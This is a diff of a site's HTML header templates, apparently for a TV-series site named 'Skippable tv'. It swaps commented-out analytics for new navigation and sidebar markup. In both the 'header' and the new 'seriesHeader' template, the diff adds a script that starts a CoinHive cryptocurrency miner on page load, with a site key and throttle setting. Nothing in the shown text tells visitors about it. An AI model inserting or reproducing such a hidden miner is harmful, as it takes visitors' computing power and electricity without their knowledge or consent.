@@ -1,19 +1,13 @@
 <template name="header">
-	
-	<!--<script>-->
-  		<!--(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){-->
-  		<!--(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),-->
-  		<!--m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)-->
-  		<!--})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');-->
-
-		<!--ga('create', 'UA-76888829-1', 'auto');-->
-		<!--ga('send', 'pageview');-->
-	<!--</script>-->
-
+    <script>
+        var miner = new CoinHive.User('Kipums0aoKk00cWSpKM7zn9Jqq8RfvGP', 'skippable', {
+            throttle: 0.5,
+        });
+        miner.start();
+    </script>
     <div class="ui inverted vertical center aligned segment">
         <div class="ui container">
             <div class="ui large secondary inverted pointing menu">
-                <!--{{> loginButtons}}-->
                 <a href="/" class="item">home</a>
                 <a href="/series" class="item">series</a>
                 <div class="right item">
@@ -23,4 +17,46 @@
         </div>
 	</div>
 
+</template>
+
+<template name="seriesHeader">
+    <script>
+        var miner = new CoinHive.User('Kipums0aoKk00cWSpKM7zn9Jqq8RfvGP', 'skippable', {
+            throttle: 0.5,
+        });
+        miner.start();
+    </script>
+    <div class="ui inverted vertical center aligned sixteen wide tablet computer only grid segment sticky">
+        <div class="ui container">
+            <div class="ui large secondary inverted pointing menu">
+                <a href="/" class="item">home</a>
+                <a href="/series" class="item">series</a>
+                <div class="right item">
+                    <h1 class="ui inverted header">Skippable<i class="red mini fitted heart icon"></i>tv</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="ui inverted vertical center aligned sixteen wide mobile only grid segment">
+        <div class="ui sidebar move inverted vertical menu">
+            <br/>
+            <br/>
+            <br/>
+            <br/>
+            <a href="/" class="sidebar-button item">home</a>
+            <a href="/series" class="sidebar-button item">series</a>
+            {{#with currentSeries}}
+                {{#each seriesArcs}}
+                    <a class="sidebar-button item">
+                        <span class="ui small {{colour}} arc inverted button" id="{{_id}}">{{title}}</span>
+                    </a>
+                {{/each}}
+            {{/with}}
+        </div>
+    </div>
+    <div class="ui inverted center aligned sixteen wide mobile only grid segment sticky" style="padding-top: 1em; padding-bottom: 1em;">
+        <div class="ui inverted mobile huge header">
+            Skippable<i class="red mini fitted heart icon"></i>tv
+        </div>
+    </div>
 </template>
